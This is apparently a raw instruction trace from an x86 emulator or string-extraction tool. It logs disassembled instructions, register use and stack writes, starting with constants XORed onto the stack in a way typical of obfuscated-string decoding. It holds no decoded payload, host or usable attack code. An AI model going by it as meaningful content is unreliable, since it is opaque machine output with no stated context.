0x10000 saving data to stack: 697701811 4 0x4064cb: movaps xmm1, xmmword ptr [esp], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4064cf: mov dword ptr [esp + 0x30], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8030 for stack size 0x10000 saving data to stack: 914789047 4 0x4064d7: mov dword ptr [esp + 0x34], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8034 for stack size 0x10000 saving data to stack: 896093928 4 0x4064df: mov dword ptr [esp + 0x38], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8038 for stack size 0x10000 saving data to stack: 929680980 4 0x4064e7: mov dword ptr [esp + 0x3c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x803c for stack size 0x10000 saving data to stack: 1389027477 4 0x4064ef: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8030 for stack size 0x10000 0x4064f5: movaps xmmword ptr [esp], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 saving data to stack: 129529134556790279516779989834294061394 16 0x4064f9: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x4064fe: mov dword ptr [esp + 0x40], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8040 for stack size 0x10000 saving data to stack: 1913178889 4 0x406506: mov dword ptr [esp + 0x44], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8044 for stack size 0x10000 saving data to stack: 2231344414 4 0x40650e: mov dword ptr [esp + 0x48], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8048 for stack size 0x10000 saving data to stack: 586689126 4 0x406516: mov dword ptr [esp + 0x4c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x804c for stack size 0x10000 saving data to stack: 1701587195 4 0x40651e: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8040 for stack size 0x10000 0x406524: movaps xmmword ptr [esp + 0x10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 saving data to stack: 63000352247702640987448294762669423213 16 0x406529: movaps xmm1, xmmword ptr [esp + 0x20], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8020 for stack size 0x10000 0x40652e: mov dword ptr [esp + 0x50], 0x23eb7d5b, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8050 for stack size 0x10000 saving data to stack: 602635611 4 0x406536: mov dword ptr [esp + 0x54], 0x72f07224, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8054 for stack size 0x10000 saving data to stack: 1928360484 4 0x40653e: mov dword ptr [esp + 0x58], 0x8b09cf88, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x8058 for stack size 0x10000 saving data to stack: 2332675976 4 0x406546: mov dword ptr [esp + 0x5c], 0x299641e1, regs_read: [30], regs_write: () adjusting stack for ESP 0x0 and offset 0x805c for stack size 0x10000 saving data to stack: 697713121 4 0x40654e: pxor xmm1, xmmword ptr [esp + 0x50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x0 and offset 0x8050 for stack size 0x10000 0x406554: push eax, regs_read: [30, 19], regs_write: [30] 0x41a4de: mov ecx, dword ptr [ebx + 0x2c], regs_read: [21], regs_write: [22] 0x41a4e4: mov dword ptr [ebx + 0x2c], eax, regs_read: [21, 19], regs_write: () 0x41a4f4: mov dword ptr [ebx + 0x2c], ecx, regs_read: [21, 22], regs_write: () 0x41a4f7: mov edi, 0x102, regs_read: (), regs_write: [23] 0x41a504: mov dword ptr [esi], eax, regs_read: [29, 19], regs_write: () 0x41a516: push 4, regs_read: [30], regs_write: [30] 0x41a51a: mov esi, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x7fe8 for stack size 0x10000 0x41a521: push 3, regs_read: [30], regs_write: [30] 0x41a523: pop eax, regs_read: [30], regs_write: [30, 19] 0x41a529: mov esi, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x7fe8 for stack size 0x10000 0x41a52c: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x41a533: mov eax, dword ptr [esi + 8], regs_read: [29], regs_write: [19] 0x41a542: push 2, regs_read: [30], regs_write: [30] 0x41a549: push eax, regs_read: [30, 19], regs_write: [30] 0x41a559: push eax, regs_read: [30, 19], regs_write: [30] 0x41a56b: push eax, regs_read: [30, 19], regs_write: [30] 0x41a573: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a574: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x41a576: push esi, regs_read: [30, 29], regs_write: [30] 0x41a577: push edi, regs_read: [30, 23], regs_write: [30] 0x41a578: mov edi, dword ptr [ebp + 8], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x20 and offset 0x8008 for stack size 0x10000 0x41a57b: mov eax, dword ptr [edi + 4], regs_read: [23], regs_write: [19] 0x41a57e: mov esi, dword ptr [eax + 0x10], regs_read: [19], regs_write: [29] 0x41a581: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41a58e: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a58f: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a590: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a592: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a593: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x41a595: push esi, regs_read: [30, 29], regs_write: [30] 0x41a596: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 0x41a5a5: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x41a5ac: mov dword ptr [esi], eax, regs_read: [29, 19], regs_write: () 0x41a5ae: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a5af: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a5b1: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a5b2: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x41a5b4: push 0, regs_read: [30], regs_write: [30] 0x41a5b6: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41a5be: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a5bf: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a5c0: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a5c2: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a5c3: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x41a5c5: push edi, regs_read: [30, 23], regs_write: [30] 0x41a5c6: mov edi, dword ptr [ebp + 8], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 0x41a5d3: mov eax, dword ptr [edi + 4], regs_read: [23], regs_write: [19] 0x41a5d6: push esi, regs_read: [30, 29], regs_write: [30] 0x41a5d7: mov esi, dword ptr [eax + 0xc], regs_read: [19], regs_write: [29] 0x41a5da: mov ecx, esi, regs_read: [29], regs_write: [22] 0x41a5e7: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a5ea: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a5eb: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a5ed: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a5ee: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x41a5f0: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a5f6: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 0x41a5f9: push 2, regs_read: [30], regs_write: [30] 0x41a5fb: push 0x100, regs_read: [30], regs_write: [30] 0x41a600: mov dword ptr [ebx], eax, regs_read: [21, 19], regs_write: () 0x41a607: mov dword ptr [ebx + 4], eax, regs_read: [21, 19], regs_write: () 0x41a60a: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a60b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a610: push esi, regs_read: [30, 29], regs_write: [30] 0x41a611: push edi, regs_read: [30, 23], regs_write: [30] 0x41a617: mov edi, dword ptr [ebx + 4], regs_read: [21], regs_write: [23] 0x41a61a: mov ecx, 0x80, regs_read: (), regs_write: [22] 0x41a61f: mov esi, eax, regs_read: [19], regs_write: [29] 0x41a621: mov dword ptr [ebx + 8], 1, regs_read: [21], regs_write: () 0x41a62a: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a62b: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a637: mov dword ptr [ebx + 4], eax, regs_read: [21, 19], regs_write: () 0x41a63f: mov eax, dword ptr [eax + 4], regs_read: [19], regs_write: [19] 0x41a642: mov dword ptr [ebx + 0xc], eax, regs_read: [21, 19], regs_write: () 0x41a649: push eax, regs_read: [30, 19], regs_write: [30] 0x41a64f: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a650: mov dword ptr [ebx + 0xc], eax, regs_read: [21, 19], regs_write: () 0x41a653: mov eax, ebx, regs_read: [21], regs_write: [19] 0x41a655: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41a656: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a658: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a659: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x41a65e: push esi, regs_read: [30, 29], regs_write: [30] 0x41a65f: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x41a662: push edi, regs_read: [30, 23], regs_write: [30] 0x41a66c: mov edi, dword ptr [eax + 8], regs_read: [19], regs_write: [23] 0x41a676: mov edi, dword ptr [esi + 0xc], regs_read: [29], regs_write: [23] 0x41a679: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x41a67b: mov dword ptr [ebp - 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x20 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x41a682: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x20 and offset 0x8008 for stack size 0x10000 0x41a69f: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a6a0: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x24 and offset 0x8008 for stack size 0x10000 0x41a6af: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a6b5: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a6c3: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x24 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x41a6c6: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41a6ce: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x24 and offset 0x7ff0 for stack size 0x10000 0x41a6d1: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41a6d3: mov edx, ebx, regs_read: [21], regs_write: [24] 0x41a6e9: push 2, regs_read: [30], regs_write: [30] 0x41a6eb: mov byte ptr [ebp - 4], dl, regs_read: [20, 16], regs_write: () adjusting stack for ESP -0x28 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x41a6ee: mov byte ptr [ebp - 3], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x28 and offset 0x7ffd for stack size 0x10000 saving data to stack: 0 1 0x41a6f1: mov byte ptr [ebp - 2], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x28 and offset 0x7ffe for stack size 0x10000 saving data to stack: 0 1 0x41a6f5: pop eax, regs_read: [30], regs_write: [30, 19] 0x41a6ff: mov eax, ebx, regs_read: [21], regs_write: [19] 0x41a704: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x24 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x41a70c: mov edx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x24 and offset 0x7ff0 for stack size 0x10000 0x41a71f: mov byte ptr [ebp - 4], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x24 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x41a722: mov byte ptr [ebp - 3], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x24 and offset 0x7ffd for stack size 0x10000 saving data to stack: 0 1 0x41a727: push 1, regs_read: [30], regs_write: [30] 0x41a729: push dword ptr [ebp - 0xc], regs_read: [30, 20], regs_write: [30] 0x41a72f: push 3, regs_read: [30], regs_write: [30] 0x41a731: push ecx, regs_read: [30, 22], regs_write: [30] 0x41a732: push eax, regs_read: [30, 19], regs_write: [30] 0x41a736: push eax, regs_read: [30, 19], regs_write: [30] 0x41a737: push 0x100, regs_read: [30], regs_write: [30] 0x41a73c: push edi, regs_read: [30, 23], regs_write: [30] 0x41a749: mov eax, ebx, regs_read: [21], regs_write: [19] 0x41a75f: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41a760: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a761: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a764: push esi, regs_read: [30, 29], regs_write: [30] 0x41a76a: mov esi, eax, regs_read: [19], regs_write: [29] 0x41a771: mov edx, dword ptr [eax + 4], regs_read: [19], regs_write: [24] 0x41a778: push edx, regs_read: [30, 24], regs_write: [30] 0x41a77e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a77f: mov edx, eax, regs_read: [19], regs_write: [24] 0x41a781: mov eax, esi, regs_read: [29], regs_write: [19] 0x41a783: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a785: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a786: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x41a788: mov eax, dword ptr [ebp + 0x18], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x3c and offset 0x8018 for stack size 0x10000 0x41a78b: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a78c: push esi, regs_read: [30, 29], regs_write: [30] 0x41a78d: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x44 and offset 0x800c for stack size 0x10000 0x41a793: push edi, regs_read: [30, 23], regs_write: [30] 0x41a794: mov edi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x48 and offset 0x8014 for stack size 0x10000 0x41a7a3: mov ebx, dword ptr [eax + 4], regs_read: [19], regs_write: [21] 0x41a7ad: mov ebx, dword ptr [eax + 4], regs_read: [19], regs_write: [21] 0x41a7b0: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41a7b6: mov eax, esi, regs_read: [29], regs_write: [19] 0x41a7bc: mov eax, edi, regs_read: [23], regs_write: [19] 0x41a7be: push eax, regs_read: [30, 19], regs_write: [30] 0x41a7bf: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x41a7c2: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41a7e3: push eax, regs_read: [30, 19], regs_write: [30] 0x41a7e4: push edi, regs_read: [30, 23], regs_write: [30] 0x41a7e5: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x41a7e8: push esi, regs_read: [30, 29], regs_write: [30] 0x41a7e9: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41a7ec: push 0x1000, regs_read: [30], regs_write: [30] 0x41a7f1: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a803: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x41a809: mov eax, 0x7fffffff, regs_read: (), regs_write: [19] 0x41a813: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a814: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a815: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41a816: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a818: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a819: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x64 and offset 0x8000 for stack size 0x10000 0x41a81e: push esi, regs_read: [30, 29], regs_write: [30] 0x41a81f: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x68 and offset 0x800c for stack size 0x10000 0x41a822: push edi, regs_read: [30, 23], regs_write: [30] 0x41a82c: mov edi, dword ptr [eax + 8], regs_read: [19], regs_write: [23] 0x41a836: mov edi, dword ptr [esi + 0xc], regs_read: [29], regs_write: [23] 0x41a839: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x41a83b: mov dword ptr [ebp - 0xc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x6c and offset 0x7ff4 for stack size 0x10000 saving data to stack: 2147483647 4 0x41a842: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x6c and offset 0x8008 for stack size 0x10000 0x41a85f: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a860: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x70 and offset 0x8008 for stack size 0x10000 0x41a86f: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a875: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41a883: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x70 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x41a886: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41a88e: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x70 and offset 0x7ff0 for stack size 0x10000 0x41a891: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41a893: mov edx, ebx, regs_read: [21], regs_write: [24] 0x41a8a9: push 2, regs_read: [30], regs_write: [30] 0x41a8ab: mov byte ptr [ebp - 4], dl, regs_read: [20, 16], regs_write: () adjusting stack for ESP -0x74 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x41a8ae: mov byte ptr [ebp - 3], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x74 and offset 0x7ffd for stack size 0x10000 saving data to stack: 0 1 0x41a8b1: mov byte ptr [ebp - 2], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x74 and offset 0x7ffe for stack size 0x10000 saving data to stack: 0 1 0x41a8b5: pop eax, regs_read: [30], regs_write: [30, 19] 0x41a8bf: mov eax, ebx, regs_read: [21], regs_write: [19] 0x41a8c4: mov dword ptr [ebp - 0x10], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x70 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x41a8cc: mov edx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x70 and offset 0x7ff0 for stack size 0x10000 0x41a8df: mov byte ptr [ebp - 4], bl, regs_read: [20, 5], regs_write: () adjusting stack for ESP -0x70 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x41a8e2: mov byte ptr [ebp - 3], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x70 and offset 0x7ffd for stack size 0x10000 saving data to stack: 0 1 0x41a8e7: push 1, regs_read: [30], regs_write: [30] 0x41a8e9: push dword ptr [ebp - 0xc], regs_read: [30, 20], regs_write: [30] 0x41a8ef: push 3, regs_read: [30], regs_write: [30] 0x41a8f1: push ecx, regs_read: [30, 22], regs_write: [30] 0x41a8f2: push eax, regs_read: [30, 19], regs_write: [30] 0x41a8f6: push eax, regs_read: [30, 19], regs_write: [30] 0x41a8f7: push 0x200, regs_read: [30], regs_write: [30] 0x41a8fc: push edi, regs_read: [30, 23], regs_write: [30] 0x41a909: mov eax, ebx, regs_read: [21], regs_write: [19] 0x41a91f: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41a920: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a921: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a924: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a925: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x88 and offset 0x8000 for stack size 0x10000 0x41a927: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x88 and offset 0x8008 for stack size 0x10000 0x41a92a: push ebx, regs_read: [30, 21], regs_write: [30] 0x41a92b: push esi, regs_read: [30, 29], regs_write: [30] 0x41a92c: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x90 and offset 0x800c for stack size 0x10000 0x41a92f: push edi, regs_read: [30, 23], regs_write: [30] 0x41a930: mov edi, edx, regs_read: [24], regs_write: [23] 0x41a936: mov edi, dword ptr [edx + 8], regs_read: [24], regs_write: [23] 0x41a93d: mov ecx, dword ptr [edx], regs_read: [24], regs_write: [22] 0x41a93f: mov esi, dword ptr [edx + 4], regs_read: [24], regs_write: [29] 0x41a945: mov dword ptr [edx], ecx, regs_read: [24, 22], regs_write: () 0x41a950: mov dword ptr [edx + 4], esi, regs_read: [24, 29], regs_write: () 0x41a957: mov ecx, dword ptr [edx], regs_read: [24], regs_write: [22] 0x41a959: mov esi, dword ptr [edx + 4], regs_read: [24], regs_write: [29] 0x41a95e: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41a960: mov esi, ebx, regs_read: [21], regs_write: [29] 0x41a965: mov dword ptr [edx], ecx, regs_read: [24, 22], regs_write: () 0x41a970: mov dword ptr [edx + 4], esi, regs_read: [24, 29], regs_write: () 0x41a973: mov eax, ecx, regs_read: [22], regs_write: [19] 0x41a975: mov ebx, esi, regs_read: [29], regs_write: [21] 0x41a97f: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x94 and offset 0x8010 for stack size 0x10000 0x41a982: mov ebx, edi, regs_read: [23], regs_write: [21] 0x41a99d: mov dword ptr [edx + 8], ebx, regs_read: [24, 21], regs_write: () 0x41a9a0: mov dword ptr [edx], ecx, regs_read: [24, 22], regs_write: () 0x41a9a2: mov dword ptr [edx + 4], esi, regs_read: [24, 29], regs_write: () 0x41a9c2: pop edi, regs_read: [30], regs_write: [30, 23] 0x41a9c3: pop esi, regs_read: [30], regs_write: [30, 29] 0x41a9c4: mov eax, edx, regs_read: [24], regs_write: [19] 0x41a9c6: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41a9c7: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41a9c9: push ebp, regs_read: [30, 20], regs_write: [30] 0x41a9ca: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x88 and offset 0x8000 for stack size 0x10000 0x41a9cf: push esi, regs_read: [30, 29], regs_write: [30] 0x41a9d0: push edi, regs_read: [30, 23], regs_write: [30] 0x41a9d1: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x41a9d7: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41a9da: push eax, regs_read: [30, 19], regs_write: [30] 0x41a9e0: mov esi, eax, regs_read: [19], regs_write: [29] 0x41a9e5: mov ecx, 0xf4240, regs_read: (), regs_write: [22] 0x41a9f1: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x9c and offset 0x7ff8 for stack size 0x10000 0x41aa03: pop edi, regs_read: [30], regs_write: [30, 23] 0x41aa04: pop esi, regs_read: [30], regs_write: [30, 29] 0x41aa09: push ebp, regs_read: [30, 20], regs_write: [30] 0x41aa0a: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x98 and offset 0x8000 for stack size 0x10000 0x41aa0c: push ecx, regs_read: [30, 22], regs_write: [30] 0x41aa0d: push ecx, regs_read: [30, 22], regs_write: [30] 0x41aa11: push eax, regs_read: [30, 19], regs_write: [30] 0x41aa17: mov edx, dword ptr [ebp - 4], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xa4 and offset 0x7ffc for stack size 0x10000 0x41aa1f: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41aa30: push ebp, regs_read: [30, 20], regs_write: [30] 0x41aa31: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xa4 and offset 0x8000 for stack size 0x10000 0x41aa33: push ebx, regs_read: [30, 21], regs_write: [30] 0x41aa34: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xa8 and offset 0x800c for stack size 0x10000 0x41aa42: push esi, regs_read: [30, 29], regs_write: [30] 0x41aa43: push edi, regs_read: [30, 23], regs_write: [30] 0x41aa49: push 0, regs_read: [30], regs_write: [30] 0x41aa4b: push 0x989680, regs_read: [30], regs_write: [30] 0x41aa50: mov esi, edx, regs_read: [24], regs_write: [29] 0x41aa52: mov edi, eax, regs_read: [19], regs_write: [23] 0x41aa54: push esi, regs_read: [30, 29], regs_write: [30] 0x41aa55: push edi, regs_read: [30, 23], regs_write: [30] 0x41aa5b: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc0 and offset 0x8008 for stack size 0x10000 0x41aa5e: push 0, regs_read: [30], regs_write: [30] 0x41aa60: push 0x989680, regs_read: [30], regs_write: [30] 0x41aa65: push esi, regs_read: [30, 29], regs_write: [30] 0x41aa66: push edi, regs_read: [30, 23], regs_write: [30] 0x41aa67: mov dword ptr [ecx], eax, regs_read: [22, 19], regs_write: () 0x41aa69: mov dword ptr [ecx + 4], edx, regs_read: [22, 24], regs_write: () 0x41aa71: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xd0 and offset 0x8008 for stack size 0x10000 0x41aa77: pop edi, regs_read: [30], regs_write: [30, 23] 0x41aa78: pop esi, regs_read: [30], regs_write: [30, 29] 0x41aa79: mov dword ptr [ecx + 8], eax, regs_read: [22, 19], regs_write: () 0x41aa80: mov eax, ebx, regs_read: [21], regs_write: [19] 0x41aa82: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41aa83: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41aa85: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x41aa96: push eax, regs_read: [30, 19], regs_write: [30] 0x41aa9c: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41aa9e: push ebp, regs_read: [30, 20], regs_write: [30] 0x41aa9f: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xc4 and offset 0x8000 for stack size 0x10000 0x41aaa4: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41aaab: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41aaae: push ebx, regs_read: [30, 21], regs_write: [30] 0x41aaaf: push esi, regs_read: [30, 29], regs_write: [30] 0x41aab0: mov esi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xcc and offset 0x8014 for stack size 0x10000 0x41aab3: push edi, regs_read: [30, 23], regs_write: [30] 0x41aab8: push esi, regs_read: [30, 29], regs_write: [30] 0x41aab9: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x41aac1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41aac4: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41aaca: mov esi, eax, regs_read: [19], regs_write: [29] 0x41aad1: push 0, regs_read: [30], regs_write: [30] 0x41aad3: push 0, regs_read: [30], regs_write: [30] 0x41aad5: push esi, regs_read: [30, 29], regs_write: [30] 0x41aad6: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x41aae3: push eax, regs_read: [30, 19], regs_write: [30] 0x41aae4: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x41aaed: mov edi, eax, regs_read: [19], regs_write: [23] 0x41aaef: mov dword ptr [ebp - 0x10], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xe8 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x41ab18: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP -0xe8 and offset 0x8000 for stack size 0x10000 0x41ab1e: mov dword ptr [ebx], 0xcccc, regs_read: [21], regs_write: () 0x41ab26: push eax, regs_read: [30, 19], regs_write: [30] 0x41ab2c: mov ebx, eax, regs_read: [19], regs_write: [21] 0x41ab2e: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41ab33: mov dword ptr [ebx], 0xdddd, regs_read: [21], regs_write: () 0x41ab3c: 